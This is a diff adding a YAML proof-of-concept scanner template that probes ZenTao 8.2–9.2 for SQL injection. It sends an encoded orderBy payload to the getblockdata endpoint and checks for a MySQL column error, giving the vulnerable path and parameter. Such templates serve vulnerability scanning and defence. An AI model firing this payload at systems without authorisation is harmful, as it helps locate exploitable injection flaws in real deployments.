@@ -1,0 +1,21 @@
+name: poc-yaml-zentao-sqli
+set:
+  referer: request.url
+  r1: randomLowercase(8)
+  r2: randomLowercase(8)
+  r3: randomLowercase(8)
+  payload: base64(urldecode("%7b%22%6f%72%64%65%72%42%79%22%3a%22" + r1 + "," + r2 + "," + r3 + "%22%2c%22%6e%75%6d%22%3a%22%31%2c%31%22%2c%22%74%79%70%65%22%3a%22%6f%70%65%6e%65%64%62%79%6d%65%22%7d"))
+rules:
+  - method: GET
+    path: /index.php?m=block&f=main&mode=getblockdata&blockid=case&param={{payload}}
+    headers:
+      Referer: '{{referer}}'
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(bytes("Unknown column '" + r1 + "' in 'order clause'")) && response.body.bcontains(bytes("`" + r1 + "`,`" + r2 + "`,`" + r3 + "`"))
+detail:
+  author: last0monster(https://github.com/last0monster)
+  effect_version: v8.2~v9.2
+  links:
+    - https://blog.csdn.net/weixin_33966365/article/details/93020545
+    - http://ximcx.cn/post-141.html
